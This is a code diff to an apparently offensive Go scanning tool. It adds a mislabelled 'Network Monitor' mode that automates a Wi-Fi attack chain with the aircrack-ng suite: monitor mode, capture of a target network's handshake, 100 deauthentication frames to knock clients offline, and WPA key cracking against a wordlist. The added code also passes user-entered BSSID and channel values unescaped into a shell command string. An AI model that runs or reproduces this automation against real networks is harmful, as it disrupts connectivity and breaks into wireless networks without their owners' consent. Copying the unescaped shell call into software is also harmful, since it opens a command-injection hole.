@@ -35,6 +35,8 @@ func main() {
 		ScanFile()
 	case "-nS", "--net-scan":
 		netScan()
+	case "-m":
+		MonitorMode()
 	default:
 		fmt.Println("Invalid option. Use '-h' or '--help' for usage instructions.")
 	}
@@ -51,6 +53,7 @@ func help() {
 	fmt.Println("	--file				Runs Vamp with your own file file with targets")
 	fmt.Println("	-v					Opens cypher scanner for specific URL/IP")
 	fmt.Println("	-nS	--net-scan		Scans the local network for Targets")
+	fmt.Println("	-m					Network Monitor")
 	fmt.Println("\n")
 	fmt.Println(" ! Note : High number of IPs for concurrent scans using the --file argument may affect your system performance")
 }
@@ -472,6 +475,109 @@ func parseNmapOutput(output string) map[string][]string {
     return scannedHosts
 }
 // ****
+
+// Ntwork Monitoring
+
+func startMonitorMode(adapter string) error {
+	fmt.Println("Starting Monitor mode.")
+	cmd := exec.Command("airmon-ng", "start", adapter)
+	return cmd.Run()
+}
+
+func captureTraffic() error {
+	fmt.Println("Opening new terminal window and capturing wireless traffic")
+	cmd := exec.Command("/bin/sh", "-c", "airodump-ng mon0")
+	return cmd.Run()
+}
+
+func scanTarget(BSSID, channel string) error {
+	fmt.Printf("Opening new terminal for target %s\n", BSSID)
+	cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("airodump-ng --bssid %s -c %s --write WPAcrack mon0", BSSID, channel))
+	return cmd.Run()
+}
+
+func deauthenticateTarget(BSSID string) error {
+	fmt.Println("Turning target offline...")
+	cmd := exec.Command("aireplay-ng", "--deauth", "100", "-a", BSSID, "mon0")
+	return cmd.Run()
+}
+
+func crackWPA(key, wordlistfile string) error {
+	fmt.Printf("Cracking WPA KEY %s\n", key)
+	cmd := exec.Command("aircrack-ng", "-w", wordlistfile, "WPAcrack")
+	return cmd.Run()
+}
+
+func MonitorMode() {
+	// Enabling monitor mode
+	fmt.Print("Specify Wireless adapter <<wlan0>>: ")
+	scanner := bufio.NewScanner(os.Stdin)
+	scanner.Scan()
+	adapter := scanner.Text()
+
+	if adapter == "" {
+		adapter = "wlan0" // Default to wlan0 if no adapter is specified
+	}
+
+	if !strings.HasPrefix(adapter, "wlan") {
+		fmt.Println(Red + "Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter." + Reset)
+		return
+	}
+
+	err := startMonitorMode(adapter)
+	if err != nil {
+		fmt.Println(Red + "Failed to enter monitor mode:" + Reset, err)
+		return
+	}
+	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
+
+	// Scanning Wireless Traffic
+	err = captureTraffic()
+	if err != nil {
+		fmt.Println(Red + "Failed to capture wireless traffic:" + Reset, err)
+		return
+	}
+
+	// Focusing on Target
+	var BSSID, channel, key, wordlistfile string
+
+	fmt.Print("Target BSSID: ")
+	scanner.Scan()
+	BSSID = scanner.Text()
+
+	fmt.Printf("Channel for %s: ", BSSID)
+	scanner.Scan()
+	channel = scanner.Text()
+
+	err = scanTarget(BSSID, channel)
+	if err != nil {
+		fmt.Println(Red + "Failed to scan target:" + Reset, err)
+		return
+	}
+
+	err = deauthenticateTarget(BSSID)
+	if err != nil {
+		fmt.Println(Red + "Failed to deauthenticate target:" + Reset, err)
+		return
+	}
+
+	fmt.Print("Provide WPA key: ")
+	scanner.Scan()
+	key = scanner.Text()
+
+	fmt.Print("Wordlist file (leave empty for default): ")
+	scanner.Scan()
+	wordlistfile = scanner.Text()
+	if wordlistfile == "" {
+		wordlistfile = "/pentest/passwords/wordlists/darkc0de"
+	}
+
+	err = crackWPA(key, wordlistfile)
+	if err != nil {
+		fmt.Println(Red + "Failed to crack WPA key:" + Reset, err)
+		return
+	}
+}
 
 /// Style
 func Icon() string {
